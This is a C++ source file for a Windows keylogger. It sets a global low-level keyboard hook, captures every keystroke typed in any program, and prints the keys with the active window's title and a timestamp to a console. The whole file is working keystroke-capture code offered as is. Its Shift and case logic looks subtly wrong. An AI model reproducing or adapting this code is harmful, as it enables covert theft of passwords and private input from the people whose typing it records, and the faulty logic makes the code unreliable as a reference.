#include <Windows.h>
#include <time.h>
#include <iostream>
#include <fstream>

#pragma warning(disable:4996)
#pragma warning(disable:4703)

using namespace std;

HHOOK HookHandle;
KBDLLHOOKSTRUCT KeyHooked;
char HookedProgramName[256];

void PrintKey(int key)
{
	if (key == 1 || key == 2)
		return;

	HWND activeWindow = GetForegroundWindow();
	DWORD processId;
	HKL keyboard;

	if (activeWindow)
	{
		processId = GetWindowThreadProcessId(activeWindow, NULL);
		keyboard = GetKeyboardLayout(processId);

		char currProg[256];
		GetWindowTextA(activeWindow, currProg, 256);

		if (strcmp(currProg, HookedProgramName) != 0)
		{
			strcpy_s(HookedProgramName, currProg);
			time_t t = time(NULL);
			struct tm* tm = localtime(&t);
			char c[64];
			strftime(c, sizeof(c), "%c", tm);

			cout << "\n\n\n[Program: " << currProg << " DateTime: " << c << "]" << endl;

		}
	}

	switch (key)
	{
	case VK_BACK:
		cout << "[BACKSPASE]";
		break;
	case VK_RETURN:
		cout << endl;
		break;
	case VK_TAB:
		cout << "[TAB]";
		break;
	case VK_SHIFT:
		cout << "[SHIFT]";
		break;
	case VK_LSHIFT:
		cout << "[SHIFT]";
		break;
	case VK_RSHIFT:
		cout << "[SHIFT]";
		break;
	case VK_CONTROL:
		cout << "[CTRL]";
		break;
	case VK_LCONTROL:
		cout << "[CTRL]";
		break;
	case VK_RCONTROL:
		cout << "[CTRL]";
		break;
	case VK_ESCAPE:
		cout << "[ESC]";
		break;
	case VK_END:
		cout << "[END]";
		break;
	case VK_HOME:
		cout << "[HOME]";
		break;
	case VK_LEFT:
		cout << "[LEFT]";
		break;
	case VK_RIGHT:
		cout << "[RIGHT]";
		break;
	case VK_UP:
		cout << "[UP]";
		break;
	case VK_DOWN:
		cout << "[DOWN]";
		break;
	case  110:
		cout << ".";
		break;
	case 109:
		cout << "-";
		break;
	case 20:
		cout << "[CAPS]";
		break;
	default: {
		bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 ||
			(GetKeyState(VK_LSHIFT) & 0x0001) != 0 ||
			(GetKeyState(VK_RSHIFT) & 0x0001) != 0)
		{
			lower = !lower;
		}

		char currentKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboard);

		if (!lower)
			currentKey = tolower(currentKey);
		cout << char(currentKey);
	}
		   break;
	}

	cout.flush();
}

LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			KeyHooked = *((KBDLLHOOKSTRUCT*)lParam);
			PrintKey(KeyHooked.vkCode);
		}
	}

	return CallNextHookEx(HookHandle, nCode, wParam, lParam);
}

int main()
{
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);

	if (!(HookHandle = SetWindowsHookExA(WH_KEYBOARD_LL, HookCallBack, NULL, 0)))
	{
		MessageBoxA(NULL, "There is an issue!", "Error", MB_ICONERROR);
	}

	MSG message;

	while (true)
	{
		GetMessageA(&message, NULL, 0, 0);
	}
}